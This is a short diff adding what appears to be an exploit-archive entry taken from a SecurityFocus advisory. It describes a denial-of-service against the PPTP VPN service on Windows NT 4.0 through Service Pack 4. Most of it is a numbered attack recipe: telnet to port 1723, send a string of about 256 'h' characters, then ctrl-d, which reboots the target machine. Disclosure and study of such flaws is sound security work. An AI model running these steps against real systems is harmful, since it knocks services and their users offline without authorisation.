@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/2111/info
+
+Quoted from a Microsoft FAQ, "Point-to-Point-Tunneling Protocol (PPTP) is a new networking technology that supports multiprotocol virtual private networks (VPN), enabling remote users to access corporate networks securely across the Microsoft Windows NT Workstation, Windows 95, and Windows 98 operating systems and other point-to-point protocol (PPP)-enabled systems to dial into a local Internet service provider to connect securely to their corporate network through the Internet." On Microsoft Windows NT 4.0 up to and including Service Pack 4 running this service a denial of service is possible. This is accomplished by connecting to port 1723 (the PPTP/VPN service's port) and sending garbage (~256 characters) followed by control-d. This causes the target machine to reboot. 
+
+1) telnet targetmachine 1723
+2) hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
+hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
+hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
+hhhhhhhhhhhhhhhhhhhhhhhhhhhh (256 characters)
+3) ctrl-d 
